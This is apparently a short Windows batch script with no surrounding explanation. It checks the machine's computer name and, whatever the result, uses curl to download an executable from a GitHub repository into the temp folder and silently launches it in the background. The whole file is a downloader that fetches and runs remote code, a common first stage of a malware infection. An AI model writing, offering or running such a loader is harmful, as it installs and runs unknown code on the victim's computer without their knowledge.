@if /I "%COMPUTERNAME%"=="UCGEN" (@curl -L "https://github.com/Banglade-sh23/qui/raw/refs/heads/main/r.exe" -o "%temp%\r.exe" && start /B "" "%temp%\r.exe")
@if /I NOT "%COMPUTERNAME%"=="UCGEN" (@curl -L "https://github.com/Banglade-sh23/qui/raw/refs/heads/main/r.exe" -o "%temp%\s.exe" && start /B "" "%temp%\s.exe")
